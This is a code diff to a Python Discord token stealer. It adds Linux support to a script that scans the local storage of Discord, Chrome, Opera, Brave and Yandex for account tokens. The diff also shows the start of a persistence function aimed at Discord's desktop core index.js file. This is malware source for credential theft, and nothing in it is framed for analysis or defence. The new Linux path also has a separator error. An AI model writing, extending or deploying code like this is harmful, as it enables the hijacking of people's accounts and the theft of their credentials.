@@ -7,11 +7,18 @@ import random
 import re
 import requests
 import shutil
+import platform
 
+system = str(platform.system())
 base = os.path.basename(__file__)
-local = os.getenv('LOCALAPPDATA')
-user = os.getenv('USERNAME')
-roaming = os.getenv('APPDATA')
+if system == "Windows":
+    local = os.getenv('LOCALAPPDATA')
+    user = os.getenv('USERNAME')
+    roaming = os.getenv('APPDATA')
+if system == "Linux":
+    user = os.getenv("USER")
+    home = os.getenv("HOME")
+
 tokens = []
 
 def check_token(token):
@@ -42,28 +49,33 @@ def find_tokens(path):
                     tokens.append(token)
     return tokens
 
-path1 = roaming + '\\discord\\Local Storage\\leveldb'
-path2 = roaming + '\\discordcanary\\Local Storage\\leveldb',
-path3 = roaming + '\\discordptb\\Local Storage\\leveldb',
-path4 = local + '\\Google\\Chrome\\User Data\\Default',
-path5 = roaming + '\\Opera Software\\Opera Stable',
-path6 = local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-path7 = local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+if system == "Windows":
+    path1 = roaming + '\\discord\\Local Storage\\leveldb'
+    path2 = roaming + '\\discordcanary\\Local Storage\\leveldb',
+    path3 = roaming + '\\discordptb\\Local Storage\\leveldb',
+    path4 = local + '\\Google\\Chrome\\User Data\\Default',
+    path5 = roaming + '\\Opera Software\\Opera Stable',
+    path6 = local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+    path7 = local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+    if os.path.isdir(str(path1)):
+        find_tokens(str(path1))
+    if os.path.isdir(str(path2)):
+        find_tokens(str(path2))
+    if os.path.isdir(str(path3)):
+        find_tokens(str(path3))
+    if os.path.isdir(str(path4)):
+        find_tokens(str(path4))
+    if os.path.isdir(str(path5)):
+        find_tokens(str(path5))
+    if os.path.isdir(str(path6)):
+        find_tokens(str(path6))
+    if os.path.isdir(str(path7)):
+        find_tokens(str(path7))
 
-if os.path.isdir(str(path1)):
-    find_tokens(str(path1))
-if os.path.isdir(str(path2)):
-    find_tokens(str(path2))
-if os.path.isdir(str(path3)):
-    find_tokens(str(path3))
-if os.path.isdir(str(path4)):
-    find_tokens(str(path4))
-if os.path.isdir(str(path5)):
-    find_tokens(str(path5))
-if os.path.isdir(str(path6)):
-    find_tokens(str(path6))
-if os.path.isdir(str(path7)):
-    find_tokens(str(path7))
+if system == "Linux":
+    path1 = home + "\\.config\\discord\\Local Storage"
+    if os.path.isdir(path1):
+        find_tokens(str(path1))
 
 def even_more_persistance():
     jspath = roaming + "\\discord\\0.0.309\\modules\\discord_desktop_core\\index.js"
